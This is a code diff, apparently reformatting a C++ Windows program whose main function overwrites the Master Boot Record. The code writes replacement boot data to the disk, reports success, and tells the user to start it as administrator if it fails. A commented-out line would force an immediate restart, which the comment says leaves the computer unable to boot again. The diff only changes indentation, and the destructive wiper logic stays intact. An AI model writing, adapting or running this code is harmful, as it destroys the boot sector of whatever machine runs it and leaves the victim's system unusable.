@@ -18,21 +18,21 @@ int main(){
 				 NULL
 				 );
 	
-if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &bytesWritten, NULL)) {
-	std::cout << "Master Boot Record was overwritten!";
-	CloseHandle(MasterBootRecord);
-	Sleep(1000);
-	//system("shutdown -r -t 00"); //Restarting pc after master boot record overwritten will cause a fatal error. Computer won't boot again. Uncomment if you want this result instantly. 
-	ExitProcess(0);
+    if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &bytesWritten, NULL)) {
+        std::cout << "Master Boot Record was overwritten!";
+        CloseHandle(MasterBootRecord);
+        Sleep(1000);
+        //system("shutdown -r -t 00"); //Restarting pc after master boot record overwritten will cause a fatal error. Computer won't boot again. Uncomment if you want this result instantly. 
+        ExitProcess(0);
 
-}
-else {
-	std::cout << "Start me as administrator! Failed code execution.";
-	CloseHandle(MasterBootRecord);
-	Sleep(5000);
-	ExitProcess(0);
-}
+    }
+    else {
+        std::cout << "Start me as administrator! Failed code execution.";
+        CloseHandle(MasterBootRecord);
+        Sleep(5000);
+        ExitProcess(0);
+    }
 
-return EXIT_SUCCESS;
+    return EXIT_SUCCESS;
 
 }
